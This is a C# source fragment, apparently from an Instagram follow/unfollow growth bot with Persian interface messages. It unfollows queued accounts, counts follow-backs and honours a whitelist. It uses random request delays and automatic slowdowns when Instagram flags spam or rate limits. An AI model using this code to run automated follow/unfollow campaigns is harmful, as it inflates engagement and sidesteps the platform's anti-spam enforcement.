                                var targetUnFollow = await db.TargetUnFollows.Where(d => d.CurrentUserPk == currentUser.Value.Pk && d.LastUpdate <= dtunFollow)
                                    .OrderBy(rand => Guid.NewGuid()).Take(1)
                                    .FirstOrDefaultAsync();

                                if (targetUnFollow != null && targetUnFollow.Pk != 2255321541 &&
                                    !db.WhiteLists.Any(w => w.CurrentUserPk == currentUser.Value.Pk && w.Pk == targetUnFollow.Pk))
                                {
                                    lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "در حال آنفالو کردن"));
                                    var friendship =
                                        await _instaApi.UserProcessor.GetFriendshipStatusAsync(targetUnFollow.Pk);
                                    Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                    if (friendship.Succeeded)
                                    {
                                        if (!db.Counters.Any(c => c.CurrentUserPk == currentUser.Value.Pk))
                                        {
                                            db.Counters.Add(CreateCounterTable(currentUser.Value.Pk));
                                            await db.SaveChangesAsync();
                                        }

                                        var counter = await db.Counters.FirstOrDefaultAsync(c => c.CurrentUserPk == currentUser.Value.Pk);

                                        if (counter != null && friendship.Value.FollowedBy)
                                        {
                                            counter.FollowBack++;
                                            lblFolloweBack.BeginInvoke((Action)(() =>
                                               lblFolloweBack.Text = (currentFollower - baseFollower).ToString()));
                                            UpdatePercentage(counter.Follow, currentFollower - baseFollower);
                                        }

                                        var unfollowUser =
                                                     await _instaApi.UserProcessor.UnFollowUserAsync(targetUnFollow.Pk);
                                        Thread.Sleep(rndSleepRequest.Next(500, 1500));
                                        if (unfollowUser.Succeeded)
                                        {
                                            //if (settings.unFollowStart)
                                            //    btnUnfollow.BeginInvoke((Action)(() => btnUnfollow.BackColor = Color.Green));

                                            stopwatchUnFollow.Restart();
                                            counter.UnFollow++;
                                            lblUnFollowed.BeginInvoke((Action)(() =>
                                               lblUnFollowed.Text = counter.UnFollow.ToString()));
                                        }
                                        else if (unfollowUser.Info.ResponseType == ResponseType.Spam)
                                        {
                                            // اینجا اومد یعنی بلاک شده

                                            CurrentUser cuTmp = await db.CurrentUsers.Where(w => w.Pk == currentUser.Value.Pk).FirstOrDefaultAsync();
                                            cuTmp.UnFollowBlock = DateTime.Now.AddHours(1);
                                            //db.CurrentUsers.Add(cuTmp);
                                            await db.SaveChangesAsync();
                                            stopwatchUnFollow.Restart();
                                            btnUnfollow.BeginInvoke((Action)(() => btnUnfollow.BackColor = AppSettings.Default.Blocked));
                                        }
                                        else if (unfollowUser.Info.ResponseType == ResponseType.RequestsLimit)
                                        {
                                            RequestLimit("Unfollow");
                                        }
                                        else
                                        {
                                            Program.Log(new Exception(unfollowUser.Info.Message), "انفالو");
                                        }
                                        db.TargetUnFollows.Remove(targetUnFollow);
                                        await db.SaveChangesAsync();
                                    }
                                    else
                                    {
                                        if (!IsConnectedToInternet())
                                        {
                                            WaitForConnectingToInternet();
                                            continue;
                                        }

                                        if (friendship.Info.ResponseType == ResponseType.UnExpectedResponse ||
                                             friendship.Info.ResponseType == ResponseType.InternalException)
                                        {
                                            db.TargetUnFollows.Remove(targetUnFollow);
                                            await db.SaveChangesAsync();
                                        }
                                        else
                                        {
                                            Program.Log(new Exception(friendship.Info.ResponseType.ToString()), "مشکلی در دریافت اطلاعات کاربر برای انفالو کردن وجود دارد" + "\n\rPK: " + targetUnFollow.Pk);
                                        }
                                    }
                                }
                                else if (targetUnFollow != null)
                                {
                                    // اینجا اومد یعنی تو وایت لیست بوده
                                    db.TargetUnFollows.Remove(targetUnFollow);
                                    await db.SaveChangesAsync();
                                }
                            }

                        }
                    }
                    else
                    {
                        btnUnfollow.BeginInvoke((Action)(() => btnUnfollow.BackColor = AppSettings.Default.Blocked));
                        lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "آنفالو این اکانت بلاک شده است"));
                    }

                    #endregion UnFollow

                    Thread.Sleep(250);
                }
                catch (Exception e)
                {
                    Program.Log(e, "حلقه اصلی برنامه");
                    continue;
                }
            }

            db.Dispose();
        }

        #endregion DoJob
        #region customMethods
        public bool IsConnectedToInternet()
        {
            try
            {
                System.Net.IPHostEntry internet = System.Net.Dns.GetHostEntry("www.google.com");
                return true;
            }
            catch (Exception ex)
            {
                Program.Log(ex, "اینترنت قطع است");
                return false;
            }
        }
        private void UpdatePercentage(long follow, long followBack)
        {
            if (follow > 0)
            {
                if (follow * 0.4 > followBack)
                {
                    lblPercentage.BeginInvoke((Action)(() =>
                        lblPercentage.Text =
                            (((double)followBack * 100.0) /
                             (double)follow).ToString("00.00") + " %"));
                }
                else
                {
                    UpdatePercentage(follow, (long)(followBack * 0.4));
                }
            }
        }

        private void WaitForConnectingToInternet()
        {
            lblMsg.BeginInvoke((Action)(() =>
                lblMsg.Text =
                    "در ارتباط با اینترنت مشکلی رخ داده است. لطفا چند دقیقه صبر نمایید"));
            lblMsg.BeginInvoke((Action)(() => lblMsg.BackColor = AppSettings.Default.ConnectionLost));
            Thread.Sleep(2 * 60 * 1000);
        }



        private Counter CreateCounterTable(long pk)
        {
            Models.Counter newCounter = new Models.Counter();
            newCounter.Reqeusted = 0;
            newCounter.Follow = 0;
            newCounter.UnFollow = 0;
            newCounter.FollowBack = 0;
            newCounter.Skipped = 0;
            newCounter.CurrentUserPk = pk;
            return newCounter;
        }

        private void FillAccountDataLabels(Counter counter, long followBack)
        {
            lblFollowed.BeginInvoke((Action)(() => lblFollowed.Text = counter.Follow.ToString()));
            lblUnFollowed.BeginInvoke((Action)(() => lblUnFollowed.Text = counter.UnFollow.ToString()));
            //lblFolloweBack.BeginInvoke((Action)(() =>
            //lblFolloweBack.Text = counter.FollowBack.ToString()));
            lblFolloweBack.BeginInvoke((Action)(() =>
                lblFolloweBack.Text = followBack.ToString()));
            //UpdatePercentage(counter.Follow, counter.FollowBack);
            UpdatePercentage(counter.Follow, followBack);
            lblSkipped.BeginInvoke((Action)(() => lblSkipped.Text = counter.Skipped.ToString()));
            lblSkipped.BeginInvoke((Action)(() => lblRequested.Text = counter.Reqeusted.ToString()));
        }

        void RequestLimit(string kind)
        {
            switch (kind)
            {

                case "Unfollow":
                    settings.unFollowPerHour = 10;
                    settings.Save();
                    lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "درخواست فالو اکانت شما با محدودیت روبرو شده.سرعت انفالو شما رو 10 تنظیم شد"));
                    Thread.Sleep(300000);// 5 دقیقه وقفه
                    break;
                case "Follow":
                    settings.followPerHour = 10;
                    settings.Save();
                    lblMsg.BeginInvoke((Action)(() => lblMsg.Text = "درخواست فالو اکانت شما با محدودیت روبرو شده..سرعت فالو شما رو 10 تنظیم شد"));
                    Thread.Sleep(300000);// 5 دقیقه وقفه
                    break;
            }
        }


        #endregion
    }
}

#region old

// متغیر های مربوز به لایسنس
//private byte[] _certPubicKeyData;
//private BotLicense _lic = null;
//private string _msg = string.Empty;
//private LicenseStatus _status = LicenseStatus.UNDEFINED;

//private void CheckLisence()
//{
//    //Read public key from assembly
//    Assembly _assembly = Assembly.GetExecutingAssembly();
//    using (MemoryStream _mem = new MemoryStream())
//    {
//        _assembly.GetManifestResourceStream("BonelliBot.LicenseVerify.cer").CopyTo(_mem);

//        _certPubicKeyData = _mem.ToArray();
//    }

//    //Check if the XML license file exists
//    if (File.Exists("license.lic"))
//    {
//        _lic = (BotLicense)LicenseHandler.ParseLicenseFromBASE64String(
//            typeof(BotLicense),
//            File.ReadAllText("license.lic"),
//            _certPubicKeyData,
//            out _status,
//            out _msg);
//    }
//    else
//    {
//        _status = LicenseStatus.INVALID;
//        _msg = "Your copy of this application is not activated";
//    }

//    switch (_status)
//    {
//        case LicenseStatus.VALID:

//            //TODO: If license is valid, you can do extra checking here
//            //TODO: E.g., check license expiry date if you have added expiry date property to your license entity
//            //TODO: Also, you can set feature switch here based on the different properties you added to your license entity 

//            // چک کردن تاریخ لایسنس
//            if (!CheckLicenseDate()) break;

//            lblLicenceStatus.BackColor = Color.FromArgb(65, 106, 180);
//            //licInfo.ShowLicenseInfo(_lic);

//            break;

//        default:
//            //for the other status of license file, show the warning message
//            //and also popup the activation form for user to activate your application
//            //MessageBox.Show(_msg, string.Empty, MessageBoxButtons.OK, MessageBoxIcon.Warning);

//            lblLicenceStatus.Text = "اکانت شما فعال نشده است";
//            lblLicenceStatus.BackColor = Color.Red;
//            btnFollow.BeginInvoke((Action)(() => btnFollow.BackColor = Color.Red));
//            btnUnfollow.BeginInvoke((Action)(() => btnUnfollow.BackColor = Color.Red));

//            settings.followStart = false;
//            settings.unFollowStart = false;
//            settings.Save();
//            break;
//    }
//    frmLicenseInfo.CertificatePublicKeyData = _certPubicKeyData;
//}
//public DateTime GetDateFromInternet()
//{
//    try
//    {
//        using (var response =
//                WebRequest.Create("http://www.google.com").GetResponse())
//            //string todaysDates =  response.Headers["date"];
//            return DateTime.ParseExact(response.Headers["date"],
//                "ddd, dd MMM yyyy HH:mm:ss 'GMT'",
//                CultureInfo.InvariantCulture.DateTimeFormat,
//                DateTimeStyles.AssumeUniversal);
//    }
//    catch (WebException)
//    {
//        return DateTime.Now; //In case something goes wrong. 
//    }
//}
//private bool CheckLicenseDate()
//{
//    if (_lic.ExpiriedDate != DateTime.MinValue)
//    {
//        if (_lic.ExpiriedDate < GetDateFromInternet())
//        {
//            lblLicenceStatus.BeginInvoke((Action)(() => lblLicenceStatus.Text = "انقضای اکانت شما به پایان رسیده است"));
//            _status = LicenseStatus.INVALID;

//            lblLicenceStatus.BeginInvoke((Action)(() => lblLicenceStatus.BackColor = Color.Red));
//            btnFollow.BeginInvoke((Action)(() => btnFollow.BackColor = Color.Red));
//            btnUnfollow.BeginInvoke((Action)(() => btnUnfollow.BackColor = Color.Red));
//            runRobot = false;
//            settings.followStart = false;
//            settings.unFollowStart = false;
//            settings.Save();
//            return false;
//        }
//        // TODO اینجا امکانات چک کنیم

//        lblLicenceStatus.BeginInvoke((Action)(() => lblLicenceStatus.Text = $"این برنامه تا تاریخ {_lic.ExpiriedDate.ToShamsi()} فعال است"));
//        return true;
//    }
//    else
//    {
//        lblLicenceStatus.BeginInvoke((Action)(() => lblLicenceStatus.Text = $"این برنامه بدون محدودیت زمانی فعال است"));
//        return true;
//    }
//}
#endregion